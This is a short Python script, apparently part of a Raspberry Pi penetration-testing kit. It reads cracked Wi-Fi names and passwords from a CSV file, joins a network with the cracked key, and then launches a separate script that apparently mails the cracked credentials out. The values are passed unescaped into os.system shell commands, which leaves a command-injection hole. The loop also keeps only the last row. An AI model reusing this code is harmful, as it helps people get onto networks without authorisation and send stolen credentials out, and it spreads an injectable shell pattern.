#!/usr/bin/env python

import csv
f=open("/home/pi/cracked.csv")
for row in csv.reader(f):
	name = row[2]
	password = row[3]


import os
os.system("sudo iwconfig wlan0 essid " + name +  " key " + password)
os.system("sudo dhclient wlan0")

os.system("sleep 30")
os.system("python /home/pi/Documents/PenPiScripts/mailCracked.py")
